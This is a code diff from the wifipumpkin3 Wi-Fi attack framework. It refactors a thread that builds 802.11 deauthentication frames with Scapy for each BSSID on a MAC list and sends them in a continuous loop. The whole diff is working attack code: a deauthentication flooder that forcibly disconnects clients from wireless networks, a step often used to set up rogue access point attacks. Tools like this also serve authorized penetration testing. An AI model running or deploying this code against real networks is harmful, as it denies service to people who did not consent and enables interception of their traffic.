@@ -21,13 +21,32 @@ from wifipumpkin3.core.utility.printer import display_messages, setcolor
 
 
 class ThreadDeauth(QThread):
-    def __init__(self, bssid, client, interface):
+    def __init__(self, mac_blacklist, client, interface):
         QThread.__init__(self)
-        self.bssid = bssid
+        self._mac_blacklist = mac_blacklist
         self.client = client
         self.interface = interface
         self.status = False
-        self.pkts = []
+        self.pkts = list()
+
+    def build_packetRadioTap(self, bssid, client):
+        pkt1 = (
+            RadioTap()
+            / Dot11(
+                type=0,
+                subtype=12,
+                addr1=client,
+                addr2=bssid,
+                addr3=bssid,
+            )
+            / Dot11Deauth(reason=7)
+        )
+        pkt2 = (
+            Dot11(addr1=bssid, addr2=client, addr3=client)
+            / Dot11Deauth()
+        )
+        self.pkts.append(pkt1)
+        self.pkts.append(pkt2)
 
     def run(self):
         print(
@@ -38,22 +57,9 @@ class ThreadDeauth(QThread):
         )
         self.status = True
         conf.iface = self.interface
-        pkt1 = (
-            RadioTap()
-            / Dot11(
-                type=0,
-                subtype=12,
-                addr1=self.client,
-                addr2=self.bssid,
-                addr3=self.bssid,
-            )
-            / Dot11Deauth(reason=7)
-        )
-        pkt2 = (
-            Dot11(addr1=self.bssid, addr2=self.client, addr3=self.client)
-            / Dot11Deauth()
-        )
-        self.pkts.append(pkt1), self.pkts.append(pkt2)
+        for target in self._mac_blacklist:
+            self.build_packetRadioTap(target, self.client)
+            
         while self.status:
             for packet in self.pkts:
                 sendp(packet, verbose=False, count=1, iface=self.interface)
@@ -65,3 +71,4 @@ class ThreadDeauth(QThread):
                 "thread {} successfully stopped".format(self.objectName()), info=True
             )
         )
+        self.pkts = list()
